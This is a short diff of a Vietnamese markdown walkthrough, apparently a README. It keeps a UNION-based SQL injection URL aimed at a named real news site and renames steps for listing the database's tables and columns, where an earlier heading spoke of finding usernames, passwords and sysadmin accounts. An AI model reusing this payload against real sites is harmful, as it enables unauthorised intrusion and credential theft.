@@ -82,9 +82,11 @@ https://csi-india.org/news/index.php?id=-18+UNION+SELECT+1,2,3,database(),5,6,7,
 
 ![image](https://github.com/user-attachments/assets/9eb20627-fe43-4f2d-a951-70ad997a8b40)
 
-**2. Tìm kiếm thông tin về username, password, tài khoản sysadmin**
+**2. Lấy các bảng trong database**
 
 ![image](https://github.com/user-attachments/assets/5175361d-dbfc-4e58-816b-a83455ffbf2f)
+
+**3. Lấy các cột trong bảng**
 
 ![image](https://github.com/user-attachments/assets/e6f0927a-96ea-4981-8369-1ce2c3304d79)
 
